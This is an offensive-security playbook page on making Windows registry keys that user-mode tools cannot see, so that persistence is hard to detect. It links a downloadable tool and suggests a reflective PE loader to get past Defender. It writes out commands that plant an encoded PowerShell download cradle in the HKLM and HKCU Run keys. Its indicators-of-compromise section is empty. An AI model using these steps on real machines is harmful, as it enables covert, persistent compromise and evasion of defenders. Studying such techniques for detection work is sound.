# Invisible Registry Keys
## Summary

It's possible to craft invisible registry keys that the Windows NT kernel is able to read, but not any user-mode applications. This allows for some unique cases of persistence that is hard to detect from the defenders perspective.

## Prerequisites

The target must be windows, and you must run this tool with the appropriate access rights required for the hive you're trying to write to. HKLM requires Administrator/SYSTEM privileges, HKCU can be modified by the current user.

## Setup

This setup requires downloading and executing the following utility, defender may or may not catch this file on disk. Potentially use a [reflective PE loader](./windows_reflective_pe_loader.md) to avoid this issue. The executable in question can be found at https://github.com/NukingDragons/invisreg. Go to Releases and download the latest executable, compilation is not required.

## Execution

### Method 1 - invisreg.exe

Running invisreg.exe without any options will provide the following output:

```help
Usage: invisreg [operation] [path] [type] [value]
       operations:
         create - Create a new invisible registry key
         edit   - Edit an existing invisible registry key
         delete - Delete an existing invisible registry key
         query  - Query an invisible registry key
       path:
         Like this - HKLM:\PATH\TO\KEY
         supported hives:
           HKLM        - HKEY_LOCAL_MACHINE
           HKCU or HCU - HKEY_CURRENT_USER
           HKCR        - HKEY_CLASSES_ROOT
           HKCC        - HKEY_CURRENT_CONFIG
           HKU         - HKEY_USERS
       type:
         REG_SZ        - Value is expected to be a string
         REG_DWORD     - Value is expected to be a 32-bit integer
         REG_QWORD     - Value is expected to be a 64-bit integer
         REG_BINARY    - Value is expected to be the name of a file
       value:
         ...

Examples:
       invisreg create HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName REG_SZ "calc.exe"
       invisreg edit HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName REG_DWORD 1337
       invisreg delete HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName
       invisreg query HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\KeyName
```

To install a powershell cradle into the run key for persistence, the following command can be used:

```cmd
.\invisreg.exe create HKLM:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\Cradle REG_SZ "powershell -enc <base64>"
```

Or for a specific user:

```cmd
.\invisreg.exe create HKCU:\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run\Cradle REG_SZ "powershell -enc <base64>"
```

#### Indicators of Compromise

TODO